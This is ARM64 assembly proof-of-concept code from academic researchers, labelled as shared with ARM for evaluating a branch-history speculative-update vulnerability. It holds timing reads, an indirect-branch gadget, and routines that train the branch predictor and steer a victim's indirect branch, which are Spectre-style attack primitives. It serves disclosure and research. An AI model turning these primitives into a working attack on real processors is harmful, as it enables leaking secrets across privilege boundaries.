/*
 * PoC Codes for Branch History Speculative Update Exploitation
 * 
 * Sunday, November 3rd 2024
 *
 * Yuhui Zhu - yuhui.zhu@santannapisa.it
 * Alessandro Biondi - alessandro.biondi@santannapisa.it
 *
 * ReTiS Lab, Scuola Superiore Sant'Anna
 * Pisa, Italy
 * 
 * This copy is distributed to ARM for vulnerability evaluation.
 */

.data

// JIT snippets since 2024/02

.align 4
.global jit_ccntr_pre_br
jit_init_cycle_cntr:
    mrs x20, pmccntr_el0

.align 4
.global jit_ccntr_post_br
jit_calc_cycle_cntr:
    mrs x19, pmccntr_el0
    sub x20, x19, x20

.align 4
.global jit_ib_gadget
jit_ib_gadget:
    ldr x0, [x0]
    blr x0

.align 4
.global jit_spec_mark_VFP
jit_spec_mark_VFP:
    fmov s0, #1.3e+01

.align 4
.global jit_spec_mark_ASE
jit_spec_mark_ASE:
    add v0.2d, v1.2d, v2.2d

.align 4
.global jit_ret
jit_ret:
    ret

.align 4
.global jit_nop
jit_nop:
    nop

// JIT snippets since 2024/04

.altmacro
.macro dbhist_train_tbz val
    ands x14, x3, 1<<(63-val)
    b.eq #12
    nop
    nop
    nop
    nop
    nop
    nop
.endm

.altmacro
.macro wait_all_ops_retire n
    dsb sy
    isb
.rept \n
    nop
.endr
.endm

.altmacro
.macro padding_nop n
.rept \n
    nop
.endr
.endm

// x0 base of ret mem
// x1 base of offset mem
// x2 num of IB injection offsets
// x3 value to train dbhist
// x8 iteration index
.align 9
.global jit_populate_bhb
.global __jit_populate_bhb_pollute_ib
.global __jit_populate_bhb_align
.global __jit_populate_bhb_end
jit_populate_bhb:
    // temporarily store return address
    mov x15, x30
    // expand the num of offset elements to actual size of offset array
    lsl x2, x2, #2
    // initialize iteration index
    mov x8, 0
__jit_populate_bhb_for:
    // load IB offset from the offset array
    ldr w7, [x1, x8]
    // calc the actual IB dest from the base addr of ret mem
    add x7, x0, w7, uxtw
__jit_populate_bhb_pollute_ib:
__jit_populate_bhb_align:
    // let's go to the ret memory!
    blr x7
    // increase iteration index
    add x8, x8, #4
    // check if iteration index reaches the boundary of the offset array.
    cmp x8, x2
    nop
    nop
    // if not, start over the loop
    b.lt __jit_populate_bhb_for
    // recover the actual return address
    mov x30, x15
    // go back home!
    ret
__jit_populate_bhb_end:

.align 4
.global jit_bst_entry_blr
.global __jit_bst_entry_blr_blr
.global __jit_bst_entry_blr_align
.global __jit_bst_entry_blr_end
jit_bst_entry_blr:
__jit_bst_entry_blr_blr:
__jit_bst_entry_blr_align:
    br x0
__jit_bst_entry_blr_end:

.align 4
.global jit_bst_evict_bcond
.global __jit_bst_evict_bcond_bne
.global __jit_bst_evict_bcond_align
.global __jit_bst_evict_bcond_end
jit_bst_evict_bcond:
    mov x2, #1
    lsl x2, x2, x1
    ands x2, x0, x2 
__jit_bst_evict_bcond_bne:
__jit_bst_evict_bcond_align:
    b.ne #12
    nop
    nop
    nop
    ret
__jit_bst_evict_bcond_end:

.altmacro
.macro __jit_bse_victim_ib_footprint
.global __jit_bse_victim_ib_footprint_\@
    // load IB offset from the offset array
    ldr w7, [x1, x8]
    // calc the actual IB dest from the base addr of ret mem
    add x7, x0, w7, uxtw
    // let's go to the ret memory!
__jit_bse_victim_ib_footprint_\@:
    blr x7
    // increase iteration index
    add x8, x8, #4
.endm

.align 4
.global jit_bse_victim
.global __jit_bse_victim_align
.global __jit_bse_victim_end
jit_bse_victim:
    // temporarily store return address
    mov x15, x30
    // initialize iteration index
    mov x8, 0
__jit_bse_victim_align:
.set i,0
.rept 6
    __jit_bse_victim_ib_footprint
.set i,i+1
.endr
    // emit an instruction barrier (and 64 nops) to wait for BPU fully updated!
    wait_all_ops_retire 64
    // setup parameters for gadgets
    mov x0, x3
    mov x1, x4
    // load indirect branch target
    ldr x2, [x2]
    // let's go
    blr x2
    // recover the actual return address
    mov x30, x15
    // go back home!
    ret
__jit_bse_victim_end: